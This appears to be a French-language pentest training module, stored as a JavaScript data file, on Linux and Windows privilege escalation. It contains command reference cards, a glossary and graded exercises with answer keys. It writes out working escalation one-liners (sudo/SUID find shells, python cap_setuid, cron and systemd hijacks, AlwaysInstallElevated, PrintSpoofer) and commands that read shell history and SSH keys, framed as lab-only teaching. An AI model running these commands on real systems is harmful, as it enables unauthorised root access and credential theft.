export default {
  blocks: [
    { t: 'h', x: "6.5 Fiches commandes : énumérer, comprendre, prouver" },
    {
      t: 'p',
      x: "L'élévation de privilèges est un travail d'<strong>enquête</strong>, pas une suite d'exploits. Chaque commande ci-dessous répond à une question précise : qui suis-je, quels droits ai-je, quels fichiers privilégiés sont mal configurés, quels services puis-je influencer ? Notez chaque résultat : c'est votre chaîne de preuve."
    },
    {
      t: 'cmdref',
      items: [
        {
          cmd: 'id / whoami / uname -a', tag: 'Contexte',
          what: "Affichent l'utilisateur courant, ses groupes, ses UID/GID, le noyau et la distribution.",
          gives: "Votre identité effective, vos groupes (sudo, adm, docker…), la version du noyau et de l'OS.",
          use: "Première commande après un accès. <code>id</code> pour les groupes, <code>uname -a</code> pour le noyau, <code>cat /etc/os-release</code> pour la distribution.",
          syntax: 'id; whoami; uname -a; cat /etc/os-release',
          example: 'id && uname -a && cat /etc/os-release | head -5',
          read: "Un groupe <code>docker</code>, <code>lxd</code> ou <code>adm</code> est souvent équivalent à root. Un noyau ancien peut être vulnérable, mais l'exploit noyau est un dernier recours.<br><br><b>Exemple :</b> <code>uid=1000(www-data) gid=33(www-data) groups=33(www-data),999(docker)</code> → l'appartenance à docker permet de monter l'hôte et d'obtenir root."
        },
        {
          cmd: 'sudo -l', tag: 'Sudo',
          what: "Liste les commandes que l'utilisateur peut exécuter avec sudo, et les éventuelles restrictions.",
          gives: "Les règles sudoers applicables : commandes autorisées, utilisateurs cibles, options NOPASSWD, variables d'environnement.",
          use: "À lancer immédiatement après l'accès. Si un mot de passe est demandé, tentez uniquement les mots de passe fournis dans le lab.",
          syntax: 'sudo -l',
          example: 'sudo -l',
          read: "Une règle <code>(ALL) NOPASSWD: /usr/bin/vim</code> signifie que vous pouvez lancer vim en root, donc ouvrir un shell via <code>:!/bin/sh</code>. Une règle sur un script modifiable est aussi exploitable.<br><br><b>Exemple :</b> <code>(root) NOPASSWD: /usr/bin/find</code> → <code>sudo find . -exec /bin/sh \\; -quit</code>."
        },
        {
          cmd: 'find SUID / SGID', tag: 'Permissions',
          what: "Recherche les fichiers qui s'exécutent avec les droits du propriétaire (SUID) ou du groupe (SGID).",
          gives: "Une liste de binaires privilégiés, avec leur chemin. Un binaire SUID root s'exécute en root.",
          use: "<code>find / -perm -4000 -type f 2>/dev/null</code> pour SUID ; <code>-2000</code> pour SGID. Croisez chaque résultat avec GTFOBins.",
          syntax: 'find / -perm -4000 -type f 2>/dev/null',
          example: 'find / -perm -4000 -type f 2>/dev/null | sort',
          read: "Tous les SUID ne sont pas exploitables. Vérifiez le propriétaire, les permissions et le comportement. Un binaire custom ou un outil connu (find, vim, python, bash) est prioritaire.<br><br><b>Exemple :</b> <code>/usr/bin/find</code> SUID root → GTFOBins donne une commande d'exécution de shell."
        },
        {
          cmd: 'getcap', tag: 'Capabilities',
          what: "Liste les capabilities POSIX attribuées aux binaires (des privilèges granulaires).",
          gives: "Les binaires avec des droits spéciaux comme <code>cap_setuid</code>, <code>cap_dac_read_search</code> ou <code>cap_net_raw</code>.",
          use: "<code>getcap -r / 2>/dev/null</code>. Une capability sur un interpréteur (python, perl) est souvent critique.",
          syntax: 'getcap -r / 2>/dev/null',
          example: 'getcap -r / 2>/dev/null',
          read: "<code>cap_setuid+ep</code> sur python permet d'appeler <code>os.setuid(0)</code>. <code>cap_dac_read_search</code> permet de lire des fichiers normalement protégés.<br><br><b>Exemple :</b> <code>/usr/bin/python3 cap_setuid+ep</code> → <code>python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'</code>."
        },
        {
          cmd: 'crontab / cron', tag: 'Tâches planifiées',
          what: "Affiche ou modifie les tâches planifiées de l'utilisateur et du système.",
          gives: "Les scripts exécutés périodiquement, leur utilisateur, leur fréquence et leur chemin.",
          use: "<code>crontab -l</code>, <code>cat /etc/crontab</code>, <code>ls -la /etc/cron.*</code>. Cherchez les scripts modifiables par votre utilisateur.",
          syntax: 'crontab -l; cat /etc/crontab; ls -la /etc/cron.*',
          example: 'cat /etc/crontab; ls -la /etc/cron.d/; crontab -l',
          read: "Un script lancé par root et modifiable par www-data permet d'exécuter du code en root à la prochaine exécution. Vérifiez les permissions et le contenu.<br><br><b>Exemple :</b> <code>*/5 * * * * root /opt/backup.sh</code> et <code>/opt/backup.sh</code> en 777 → injectez une commande, attendez 5 minutes, vérifiez l'exécution."
        },
        {
          cmd: 'ss / ps', tag: 'Services & processus',
          what: "<code>ss</code> liste les sockets réseau ; <code>ps</code> liste les processus et leurs utilisateurs.",
          gives: "Les services qui écoutent, les ports, les processus root et leurs lignes de commande.",
          use: "<code>ss -tulnp</code> (ports en écoute), <code>ps aux --forest</code> (arborescence des processus).",
          syntax: 'ss -tulnp; ps aux --forest',
          example: 'ss -tulnp; ps aux --forest | head -30',
          read: "Un service interne en root sur un port local peut être une cible de pivot. Une ligne de commande contenant un mot de passe est une fuite. Un processus root avec un binaire modifiable est une piste.<br><br><b>Exemple :</b> <code>root 1234 /opt/app/server --config /opt/app/config.yml</code> et le dossier /opt/app est writable → remplacez le binaire ou la config."
        },
        {
          cmd: 'find -writable', tag: 'Fichiers modifiables',
          what: "Recherche les fichiers ou dossiers accessibles en écriture par l'utilisateur courant.",
          gives: "Les chemins modifiables, y compris des scripts, configurations ou binaires utilisés par des services privilégiés.",
          use: "Exclure les zones de l'utilisateur et les pseudo-fichiers : <code>find / -writable -type f 2>/dev/null | grep -v -E '^/proc|^/sys|^/home'</code>.",
          syntax: "find / -writable -type f 2>/dev/null | grep -v -E '^/proc|^/sys'",
          example: "find / -writable -type f 2>/dev/null | grep -v -E '^/proc|^/sys|^/home' | head -30",
          read: "Un fichier modifiable dans /etc, /opt ou /var/www peut être utilisé par un service root. Vérifiez le propriétaire et le contexte avant de conclure.<br><br><b>Exemple :</b> <code>/etc/systemd/system/app.service</code> modifiable → changez ExecStart, rechargez le service, exécutez votre commande."
        },
        {
          cmd: 'Historique & clés', tag: 'Secrets',
          what: "Lit l'historique shell, les fichiers de configuration et les clés SSH accessibles.",
          gives: "Des mots de passe, des commandes sensibles, des chemins internes et des clés privées.",
          use: "<code>cat ~/.bash_history</code>, <code>ls -la ~/.ssh</code>, <code>cat ~/.ssh/id_rsa</code> si lisible, <code>grep -Ri password /var/www 2>/dev/null</code>.",
          syntax: 'cat ~/.bash_history; ls -la ~/.ssh; grep -Ri "password" /var/www 2>/dev/null',
          example: 'cat ~/.bash_history | tail -30; ls -la ~/.ssh',
          read: "Une clé privée lisible permet de rebondir sur d'autres machines. Un mot de passe en clair dans un historique ou un fichier de config peut être réutilisé, dans le périmètre autorisé uniquement.<br><br><b>Exemple :</b> l'historique contient <code>mysql -u root -p'SuperSecret'</code> → identifiants à tester sur la base locale, pas ailleurs."
        },
        {
          cmd: 'GTFOBins', tag: 'Exploitation (lab)',
          what: "Base de commandes permettant d'utiliser un binaire légitime (SUID, sudo, capability) pour exécuter un shell ou lire/écrire des fichiers.",
          gives: "La commande exacte à utiliser pour un binaire donné, selon le contexte (SUID, sudo, capability).",
          use: "Identifier le binaire trouvé, puis consulter GTFOBins. Tester uniquement en lab, avec la commande adaptée au contexte.",
          syntax: 'find . -exec /bin/sh -p \\; -quit',
          example: '/usr/bin/find . -exec /bin/sh -p \\; -quit',
          read: "Le shell obtenu a l'EUID root (<code>id</code> affiche euid=0), même si l'UID réel reste l'utilisateur. Vérifiez avec <code>id</code>.<br><br><b>Exemple :</b> SUID find → <code>find . -exec /bin/sh -p \\; -quit</code> → shell root. Documentez la commande exacte et les permissions."
        },
        {
          cmd: 'whoami /all (Windows)', tag: 'Windows · contexte',
          what: "Affiche l'utilisateur, les groupes, les privilèges et le niveau d'intégrité Windows.",
          gives: "Les privilèges actifs (SeImpersonate, SeDebug, SeBackup…), les groupes administrateurs et le contexte d'élévation.",
          use: "Première commande après un accès Windows. <code>whoami /priv</code> pour les privilèges seuls.",
          syntax: 'whoami /all',
          example: 'whoami /all',
          read: "<code>SeImpersonatePrivilege</code> ouvre la voie aux attaques de type Potato. <code>SeDebugPrivilege</code> permet d'injecter dans un processus privilégié. <code>SeBackupPrivilege</code> permet de lire des fichiers protégés.<br><br><b>Exemple :</b> <code>SeImpersonatePrivilege Enabled</code> + service vulnérable → PrintSpoofer en lab."
        },
        {
          cmd: 'wmic / icacls / accesschk', tag: 'Windows · services',
          what: "<code>wmic</code> interroge les services et chemins ; <code>icacls</code> affiche les permissions ; <code>accesschk</code> (Sysinternals) trouve les objets accessibles.",
          gives: "Les services automatiques, leurs chemins, les permissions des dossiers et les droits des groupes.",
          use: "<code>wmic service get name,displayname,pathname,startmode | findstr /i auto</code> ; <code>icacls \"C:\\Program Files\\App\"</code> ; <code>accesschk.exe -uwcqv \"Users\" *</code>.",
          syntax: 'wmic service get name,pathname,startmode | findstr /i auto',
          example: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto"',
          read: "Un chemin non quoté contenant un espace (<code>C:\\Program Files\\My App\\svc.exe</code>) peut être détourné en plaçant <code>C:\\Program.exe</code>. Des permissions faibles sur le dossier d'un service permettent de remplacer le binaire.<br><br><b>Exemple :</b> <code>C:\\Program Files\\Vuln App\\service.exe</code> + droit d'écriture sur le dossier → remplacez service.exe et redémarrez."
        },
        {
          cmd: 'reg query (AlwaysInstallElevated)', tag: 'Windows · registre',
          what: "Interroge le registre Windows pour vérifier des politiques dangereuses.",
          gives: "La valeur AlwaysInstallElevated pour HKLM et HKCU. Si les deux sont à 1, un MSI s'installe en SYSTEM.",
          use: "Vérifier les deux ruches : <code>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated</code> et la même pour HKCU.",
          syntax: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
          example: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
          read: "Si les deux valeurs sont à <code>0x1</code>, un MSI malveillant s'installe avec les droits SYSTEM. C'est une configuration à corriger.<br><br><b>Exemple :</b> les deux clés à 1 → générez un MSI de test en lab, installez-le, vérifiez l'identité SYSTEM."
        },
        {
          cmd: 'grep auth.log / journalctl', tag: 'Logs Linux',
          what: "Recherche les événements d'authentification et les erreurs système dans les journaux.",
          gives: "Les tentatives échouées, les connexions réussies, les commandes sudo et les sessions.",
          use: "<code>grep -Ei \"failed password|accepted password|sudo:\" /var/log/auth.log</code> ; <code>journalctl --since ... | grep ...</code>. En Blue Team, cherchez les anomalies.",
          syntax: 'grep -Ei "failed|accepted|sudo:" /var/log/auth.log',
          example: 'grep -Ei "failed password|accepted password|sudo:" /var/log/auth.log | tail -20',
          read: "Une série de « Failed password » suivie d'un « Accepted » indique un brute force réussi. Une commande sudo inattendue est un signal. Les logs peuvent être absents ou rotés.",
          pivot: "En audit, documentez la fenêtre et les preuves. En défense, corrélez avec l'IP source et alertez sur les pics."
        },
        {
          cmd: 'Nettoyage contrôlé', tag: 'Fin de mission',
          what: "Supprime les artefacts créés pendant le test (compte, cron, service, fichier) après capture des preuves.",
          gives: "Un retour à l'état initial, documenté et vérifiable.",
          use: "<code>rm -f /etc/cron.d/audit-test</code>, <code>systemctl daemon-reload</code>, <code>userdel audit-test</code>. Uniquement les artefacts que vous avez créés.",
          syntax: 'rm -f artefact; systemctl daemon-reload; userdel compte_test',
          example: 'rm -f /etc/cron.d/audit-test && systemctl daemon-reload && userdel audit-test',
          read: "Vérifiez que l'artefact a bien disparu et que le service fonctionne toujours. Conservez les preuves et les hashes avant suppression.",
          pivot: "En mission réelle, le nettoyage est planifié avec le client et consigné. Ne supprimez jamais un fichier préexistant ou un compte légitime."
        }
      ]
    },
    { t: 'h', x: "6.6 Glossaire : privilèges, services et post-exploitation" },
    {
      t: 'glossary',
      items: [
        { term: 'Élévation de privilèges', def: "Passer d'un niveau de droits limité à un niveau supérieur (root, SYSTEM, administrateur).", use: "Chercher les mauvaises configurations avant les exploits noyau.", ex: 'www-data → root via un cron modifiable' },
        { term: 'SUID / SGID', def: "Bits de permission qui font exécuter un fichier avec les droits du propriétaire (SUID) ou du groupe (SGID).", use: "Rechercher les binaires SUID root et vérifier leur exploitabilité via GTFOBins.", ex: '-rwsr-xr-x root root /usr/bin/find' },
        { term: 'Capabilities', def: "Privilèges granulaires attribués à un binaire (ex. cap_setuid, cap_net_raw).", use: "Rechercher les capabilities dangereuses sur des interpréteurs ou outils.", ex: 'getcap /usr/bin/python3' },
        { term: 'Sudoers', def: "Fichier de configuration des droits sudo.", use: "Vérifier les règles NOPASSWD, les commandes autorisées et les scripts modifiables.", ex: 'sudo -l' },
        { term: 'Cron', def: "Planificateur de tâches Unix.", use: "Chercher les scripts exécutés par root mais modifiables par l'utilisateur courant.", ex: '/etc/cron.d/backup' },
        { term: 'Systemd', def: "Gestionnaire de services Linux, configuré par des unités .service.", use: "Vérifier les unités modifiables, les ExecStart et les chemins relatifs.", ex: 'systemctl list-units --type=service' },
        { term: 'PATH hijack', def: "Détournement d'un binaire appelé sans chemin absolu, en plaçant un faux binaire plus tôt dans le PATH.", use: "Repérer les scripts root qui appellent une commande relative.", ex: 'export PATH=/tmp:$PATH' },
        { term: 'Unquoted service path', def: "Chemin de service Windows non entouré de guillemets, contenant des espaces.", use: "Placer un exécutable au nom intermédiaire pour être lancé par le service.", ex: 'C:\\Program Files\\My App\\svc.exe' },
        { term: 'Token Windows', def: "Objet qui représente l'identité et les privilèges d'un processus.", use: "Les privilèges SeImpersonate/SeAssignPrimaryToken permettent d'usurper un token privilégié.", ex: 'whoami /priv' },
        { term: 'SeImpersonate', def: "Privilège Windows permettant d'emprunter le token d'un autre utilisateur.", use: "Exploiter un service qui se connecte avec ce privilège (Potato, PrintSpoofer) en lab.", ex: 'PrintSpoofer.exe -i -c cmd' },
        { term: 'AlwaysInstallElevated', def: "Politique Windows qui permet d'installer des MSI avec les droits SYSTEM.", use: "Vérifier HKLM et HKCU ; si activée, un MSI de test s'exécute en SYSTEM.", ex: 'reg query ... /v AlwaysInstallElevated' },
        { term: 'Persistance', def: "Mécanisme permettant à un attaquant de revenir après un redémarrage.", use: "En Red Team autorisée, documenter et limiter dans le temps ; en Blue Team, rechercher les artefacts.", ex: 'clé SSH, cron, service, tâche planifiée' },
        { term: 'IOC', full: 'indicateur de compromission', def: "Élément observable qui suggère une intrusion (fichier, hash, IP, commande, clé de registre).", use: "Collecter, corréler et conserver pour la détection et le rapport.", ex: 'fichier récent dans /etc/cron.d' },
        { term: 'auditd', def: "Service d'audit Linux qui journalise les appels système et les accès fichiers.", use: "Configurer des règles pour détecter les modifications de fichiers sensibles.", ex: 'auditctl -w /etc/passwd -p wa' },
        { term: 'Event ID', def: "Identifiant d'un événement Windows dans le journal de sécurité.", use: "Surveiller 4624 (connexion), 4625 (échec), 4720 (création de compte), 4698 (tâche planifiée).", ex: 'Get-WinEvent -FilterHashtable @{Id=4625}' },
        { term: 'Pivot', def: "Utiliser une machine compromise comme point d'accès vers un autre réseau.", use: "Cartographier les réseaux accessibles, documenter chaque saut, rester dans le périmètre.", ex: 'ssh -L 8080:interne:80 user@compromis' },
        { term: 'Mouvement latéral', def: "Déplacement d'une machine à une autre avec les mêmes identifiants ou des identifiants volés.", use: "Détecter les connexions inhabituelles, segmenter le réseau, utiliser le moindre privilège.", ex: 'réutilisation de mot de passe' },
        { term: 'root / SYSTEM', def: "Comptes aux privilèges maximaux sous Linux et Windows.", use: "Objectif d'une élévation de privilèges en lab ; en rapport, prouver l'accès sans abuser.", ex: 'uid=0(root) / NT AUTHORITY\\SYSTEM' }
      ]
    }
  ],
  exos: [
    {
      id: 'm6-e1',
      title: 'Identifier votre contexte',
      context: "Vous venez d'obtenir un accès shell sur une VM de lab. Vous devez savoir qui vous êtes.",
      task: "Affichez votre identité, vos groupes et le noyau.",
      hint: "Enchaînez <code>id</code>, <code>whoami</code> et <code>uname -a</code>.",
      accept: [/^id\s*;\s*whoami\s*;\s*uname\s+-a$/i, /^id\s*&&\s*whoami\s*&&\s*uname\s+-a$/i],
      solution: 'id; whoami; uname -a',
      output: [
        'uid=33(www-data) gid=33(www-data) groups=33(www-data),999(docker)',
        'www-data',
        'Linux dvwa 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux',
        '++www-data appartient au groupe docker'
      ],
      read: "L'utilisateur est www-data, sans sudo apparent, mais membre du groupe docker. Le noyau est récent.",
      pivot: "Le groupe docker est souvent équivalent à root : un conteneur peut monter l'hôte. Vérifiez les droits docker avant de chercher un exploit noyau."
    },
    {
      id: 'm6-e2',
      title: 'Lister les droits sudo',
      context: "Vous devez savoir quelles commandes vous pouvez exécuter avec sudo.",
      task: "Affichez les règles sudo de l'utilisateur courant.",
      hint: "La commande est <code>sudo -l</code>.",
      accept: [/^sudo\s+-l$/i],
      solution: 'sudo -l',
      output: [
        'Matching Defaults entries for www-data on dvwa:',
        '    env_reset, mail_badpass, secure_path=/usr/local/sbin:…',
        'User www-data may run the following commands on dvwa:',
        '    (root) NOPASSWD: /usr/bin/find',
        '++Une règle NOPASSWD sur /usr/bin/find'
      ],
      read: "www-data peut lancer find en root sans mot de passe. C'est une élévation directe.",
      pivot: "Utilisez GTFOBins pour find : <code>sudo find . -exec /bin/sh \\; -quit</code>. Documentez la règle sudo exacte."
    },
    {
      id: 'm6-e3',
      title: 'Trouver les binaires SUID',
      context: "Vous cherchez des binaires qui s'exécutent avec les droits de leur propriétaire.",
      task: "Recherchez tous les fichiers SUID sur le système, en masquant les erreurs.",
      hint: "Utilisez <code>find / -perm -4000 -type f 2&gt;/dev/null</code>.",
      accept: [/^find\s+\/\s+-perm\s+-4000\s+-type\s+f\s+2>\/dev\/null$/i, /^find\s+\/\s+-perm\s+-4000\s+-type\s+f\s+2>\/dev\/null\s+\|\s+sort$/i],
      solution: 'find / -perm -4000 -type f 2>/dev/null | sort',
      output: [
        '/usr/bin/find',
        '/usr/bin/passwd',
        '/usr/bin/sudo',
        '/usr/bin/python3',
        '/usr/lib/openssh/ssh-keysign',
        '++5 binaires SUID trouvés'
      ],
      read: "find et python3 sont inhabituels en SUID root. passwd et sudo sont normaux. ssh-keysign est attendu.",
      pivot: "Croisez find et python3 avec GTFOBins. Vérifiez les permissions exactes avec <code>ls -la</code> avant de conclure."
    },
    {
      id: 'm6-e4',
      title: 'Lister les capabilities',
      context: "Un binaire peut avoir des privilèges sans être SUID. Vous devez chercher les capabilities.",
      task: "Recherchez toutes les capabilities du système, en masquant les erreurs.",
      hint: "Utilisez <code>getcap -r / 2&gt;/dev/null</code>.",
      accept: [/^getcap\s+-r\s+\/\s+2>\/dev\/null$/i],
      solution: 'getcap -r / 2>/dev/null',
      output: [
        '/usr/bin/python3 cap_setuid+ep',
        '/usr/bin/ping cap_net_raw+ep',
        '++python3 avec cap_setuid'
      ],
      read: "ping a une capability normale. python3 avec cap_setuid est critique : il peut changer d'UID.",
      pivot: "Exécutez <code>python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'</code> en lab, puis recommandez le retrait de la capability."
    },
    {
      id: 'm6-e5',
      title: 'Analyser les tâches cron',
      context: "Vous cherchez un script exécuté par root mais modifiable par votre utilisateur.",
      task: "Affichez le contenu de <code>/etc/crontab</code> et la liste des fichiers de <code>/etc/cron.d/</code>.",
      hint: "Enchaînez <code>cat /etc/crontab</code> et <code>ls -la /etc/cron.d/</code>.",
      accept: [/^cat\s+\/etc\/crontab\s*;\s*ls\s+-la\s+\/etc\/cron\.d\/?$/i, /^cat\s+\/etc\/crontab.*ls\s+-la\s+\/etc\/cron\.d/i],
      solution: 'cat /etc/crontab; ls -la /etc/cron.d/',
      output: [
        'SHELL=/bin/sh',
        'PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin',
        '*/5 * * * * root /opt/backup.sh',
        'total 12',
        'drwxr-xr-x 2 root root 4096 Oct 24 10:00 .',
        '-rw-r--r-- 1 root root  120 Oct 24 09:00 backup',
        '++backup.sh exécuté toutes les 5 minutes par root'
      ],
      read: "Le script /opt/backup.sh est lancé par root. Il faut vérifier ses permissions : s'il est modifiable par www-data, c'est une élévation.",
      pivot: "<code>ls -la /opt/backup.sh</code>. Si writable, ajoutez une commande de test, attendez l'exécution, vérifiez le résultat, puis nettoyez."
    },
    {
      id: 'm6-e6',
      title: 'Chercher des fichiers modifiables',
      context: "Vous devez trouver un fichier utilisé par un service root mais accessible en écriture.",
      task: "Recherchez les fichiers modifiables hors /proc, /sys et /home.",
      hint: "Utilisez <code>find / -writable -type f 2&gt;/dev/null | grep -v -E '^/proc|^/sys|^/home'</code>.",
      accept: [/^find\s+\/\s+-writable\s+-type\s+f\s+2>\/dev\/null\s+\|\s+grep\s+-v\s+-E\s+.*proc.*sys.*home/i],
      solution: "find / -writable -type f 2>/dev/null | grep -v -E '^/proc|^/sys|^/home' | head -30",
      output: [
        '/opt/backup.sh',
        '/var/www/html/config.php',
        '/etc/systemd/system/app.service',
        '++3 fichiers modifiables hors zones utilisateur'
      ],
      read: "backup.sh est lancé par cron root, app.service est une unité systemd. Les deux peuvent mener à root si leur contenu est modifiable.",
      pivot: "Priorisez app.service : changez ExecStart vers une commande de test, rechargez le service avec <code>systemctl daemon-reload</code>, redémarrez-le."
    },
    {
      id: 'm6-e7',
      title: 'Lire l\'historique shell',
      context: "Vous cherchez des identifiants ou des chemins internes laissés par un administrateur.",
      task: "Affichez les 30 dernières lignes de l'historique de l'utilisateur courant.",
      hint: "Utilisez <code>cat ~/.bash_history | tail -30</code>.",
      accept: [/^cat\s+~?\/?\.bash_history\s*\|\s*tail\s+-n?\s*30$/i, /^tail\s+-n?\s*30\s+~?\/?\.bash_history$/i],
      solution: 'cat ~/.bash_history | tail -30',
      output: [
        'mysql -u root -pSuperSecret',
        'cd /var/www/html',
        'nano config.php',
        'systemctl restart app',
        '++Identifiants MySQL trouvés dans l\'historique'
      ],
      read: "Un mot de passe MySQL est visible en clair. Il peut être réutilisé sur la base locale, dans le périmètre du lab.",
      pivot: "Testez le mot de passe sur la base locale uniquement, documentez la fuite, et recommandez l'usage d'un gestionnaire de secrets et la désactivation de l'historique pour les commandes sensibles."
    },
    {
      id: 'm6-e8',
      title: 'Vérifier un privilège Windows',
      context: "Vous avez un accès PowerShell sur une VM Windows de lab. Vous devez identifier les privilèges dangereux.",
      task: "Affichez tous les privilèges de l'utilisateur courant.",
      hint: "Utilisez <code>whoami /priv</code>.",
      accept: [/^whoami\s+\/priv$/i],
      solution: 'whoami /priv',
      output: [
        'PRIVILEGES INFORMATION',
        '----------------------',
        'Privilege Name                Description                         State',
        '============================= =================================== ========',
        'SeImpersonatePrivilege        Impersonate a client after login    Enabled',
        'SeAssignPrimaryTokenPrivilege Replace a process level token      Disabled',
        'SeDebugPrivilege              Debug programs                      Disabled',
        '++SeImpersonatePrivilege activé'
      ],
      read: "SeImpersonate est activé. C'est le prérequis des attaques Potato/PrintSpoofer sur un service vulnérable.",
      pivot: "Cherchez un service qui se connecte avec ce privilège. En lab, testez PrintSpoofer et documentez la chaîne, sans l'exécuter en production."
    },
    {
      id: 'm6-e9',
      title: 'Chercher un service Windows mal configuré',
      context: "Vous devez lister les services automatiques et leurs chemins.",
      task: "Affichez les services en démarrage automatique avec leur chemin.",
      hint: "Utilisez <code>wmic service get name,displayname,pathname,startmode | findstr /i auto</code>.",
      accept: [/^wmic\s+service\s+get\s+name,displayname,pathname,startmode\s*\|\s*findstr\s+\/i\s+auto$/i],
      solution: 'wmic service get name,displayname,pathname,startmode | findstr /i auto',
      output: [
        'AppSvc       App Service       C:\\Program Files\\Vuln App\\service.exe   Auto',
        'Spooler      Print Spooler     C:\\Windows\\System32\\spoolsv.exe       Auto',
        '++Chemin non quoté détecté pour AppSvc'
      ],
      read: "Le chemin de AppSvc contient des espaces et n'est pas entre guillemets. Windows essaiera C:\\Program.exe avant le chemin complet.",
      pivot: "Vérifiez si vous pouvez écrire dans C:\\ ou dans C:\\Program Files. Si oui, placez un binaire de test nommé Program.exe et redémarrez le service en lab."
    },
    {
      id: 'm6-e10',
      title: 'Vérifier AlwaysInstallElevated',
      context: "Vous devez vérifier une politique Windows qui permettrait d'installer un MSI en SYSTEM.",
      task: "Interrogez les deux clés de registre AlwaysInstallElevated (HKLM et HKCU).",
      hint: "Deux <code>reg query</code> sur <code>...\\Windows\\Installer /v AlwaysInstallElevated</code>.",
      accept: [/^reg\s+query\s+HKLM.*AlwaysInstallElevated.*reg\s+query\s+HKCU.*AlwaysInstallElevated/i],
      solution: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
      output: [
        'HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer',
        '    AlwaysInstallElevated    REG_DWORD    0x1',
        'HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer',
        '    AlwaysInstallElevated    REG_DWORD    0x1',
        '++Les deux valeurs sont à 1 : MSI en SYSTEM'
      ],
      read: "Les deux clés sont activées. Tout MSI installé par l'utilisateur s'exécute avec les droits SYSTEM.",
      pivot: "En lab, générez un MSI de test qui exécute une commande, installez-le, vérifiez l'identité, puis nettoyez. Recommandez la désactivation de la politique."
    },
    {
      id: 'm6-e11',
      title: 'Analyser les connexions échouées',
      context: "Vous devez vérifier si un brute force a eu lieu pendant la fenêtre d'audit.",
      task: "Filtrez <code>/var/log/auth.log</code> pour les échecs et succès de mot de passe, puis affichez les 20 dernières lignes.",
      hint: "Utilisez <code>grep -Ei</code> et <code>tail -20</code>.",
      accept: [/^grep\s+-Ei\s+["']failed password\|accepted password["'].*auth\.log.*tail\s+-n?\s*20/i, /^grep\s+-Ei\s+["']failed.*accepted.*auth\.log/i],
      solution: 'grep -Ei "failed password|accepted password" /var/log/auth.log | tail -20',
      output: [
        'Oct 24 09:12:01 dvwa sshd[1201]: Failed password for invalid user admin from 203.0.113.77 port 51022 ssh2',
        'Oct 24 09:12:03 dvwa sshd[1203]: Failed password for invalid user root from 203.0.113.77 port 51024 ssh2',
        'Oct 24 09:12:05 dvwa sshd[1205]: Failed password for www-data from 203.0.113.77 port 51026 ssh2',
        'Oct 24 09:15:42 dvwa sshd[1210]: Accepted password for www-data from 203.0.113.77 port 51040 ssh2',
        '!!Échecs répétés puis succès depuis la même IP'
      ],
      read: "Trois échecs puis une connexion réussie depuis la même IP en quelques minutes : brute force réussi probable.",
      pivot: "Corrélez avec l'IP et l'heure. En défense, bloquez l'IP, forcez la rotation du mot de passe, activez MFA et alertez. En audit, documentez la preuve."
    },
    {
      id: 'm6-e12',
      title: 'Vérifier un accès root',
      context: "Après une exploitation de lab, vous devez confirmer que vous avez bien les droits root.",
      task: "Affichez l'identité après élévation.",
      hint: "La commande est <code>id</code>.",
      accept: [/^id$/i],
      solution: 'id',
      output: [
        'uid=0(root) gid=0(root) groups=0(root)',
        '++EUID et UID à 0 : accès root confirmé'
      ],
      read: "L'UID et l'EUID sont à 0. L'accès root est effectif.",
      pivot: "Capturez la preuve, notez la commande utilisée et les permissions. Ne poursuivez pas au-delà de l'objectif du lab."
    },
    {
      id: 'm6-e13',
      title: 'Nettoyer un artefact de test',
      context: "Vous avez créé un fichier cron de test. Vous devez le supprimer et recharger systemd.",
      task: "Supprimez <code>/etc/cron.d/audit-test</code> puis rechargez systemd.",
      hint: "Utilisez <code>rm -f</code> et <code>systemctl daemon-reload</code>.",
      accept: [/^rm\s+-f\s+\/etc\/cron\.d\/audit-test\s*&&\s*systemctl\s+daemon-reload$/i, /^rm\s+-f\s+\/etc\/cron\.d\/audit-test.*systemctl/i],
      solution: 'rm -f /etc/cron.d/audit-test && systemctl daemon-reload',
      output: [
        '..(fichier supprimé)',
        '++systemd rechargé, artefact de test retiré'
      ],
      read: "L'artefact est supprimé et systemd a relu sa configuration. Vérifiez qu'aucun autre artefact ne reste.",
      pivot: "Conservez les preuves et les hashes avant suppression. En mission, listez chaque artefact créé et son état final."
    },
    {
      id: 'm6-e14',
      title: 'Lire les sockets en écoute',
      context: "Vous cherchez un service interne accessible uniquement en local.",
      task: "Affichez les sockets TCP/UDP en écoute avec le processus associé.",
      hint: "Utilisez <code>ss -tulnp</code>.",
      accept: [/^ss\s+-tulnp$/i],
      solution: 'ss -tulnp',
      output: [
        'Netid State  Local Address:Port  Process',
        'tcp   LISTEN 127.0.0.1:3306      mysqld',
        'tcp   LISTEN 0.0.0.0:80          nginx',
        'tcp   LISTEN 127.0.0.1:6379      redis-server',
        '++MySQL et Redis en local uniquement'
      ],
      read: "MySQL et Redis écoutent uniquement en local, mais sont accessibles depuis la machine compromise. Ce sont des cibles de pivot.",
      pivot: "Testez les identifiants trouvés dans l'historique sur MySQL local. Ne pivotez pas vers un autre réseau sans autorisation explicite."
    }
  ]
};
